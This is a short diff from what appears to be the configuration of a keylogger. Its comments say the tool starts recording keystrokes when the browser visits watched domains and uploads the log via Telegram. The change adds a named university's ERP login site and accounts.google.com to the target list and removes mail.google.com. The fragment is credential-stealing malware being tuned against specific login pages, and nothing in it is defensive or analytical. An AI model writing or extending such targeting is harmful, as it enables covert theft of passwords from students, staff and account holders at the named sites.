@@ -53,8 +53,9 @@ POLL_INTERVAL = 10  # seconds
 # When the active browser URL/title matches any of these domains, start keylogging
 # for KEYLOG_ON_VISIT_SECONDS, then auto-upload the log via Telegram.
 WATCH_DOMAINS = [
+    "erp.uttarauniversity.edu.bd",
+    "accounts.google.com",
     "gmail.com",
-    "mail.google.com",
     # "facebook.com",
     # "login.microsoftonline.com",
 ]
